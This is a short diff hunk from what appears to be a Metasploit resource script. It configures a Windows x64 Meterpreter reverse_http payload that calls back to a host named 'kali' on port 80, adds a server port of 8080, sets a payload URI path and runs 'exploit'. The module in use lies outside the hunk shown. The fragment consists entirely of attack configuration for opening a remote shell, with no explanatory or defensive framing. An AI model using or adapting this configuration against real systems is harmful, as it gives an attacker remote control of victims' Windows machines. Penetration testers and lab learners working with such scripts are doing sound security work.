@@ -4,6 +4,7 @@ set payload windows/x64/meterpreter/reverse_http
 set lhost kali
 set lport 80
 set srvhost kali
+set srvport 8080
 set URIPATH payload
 exploit
 
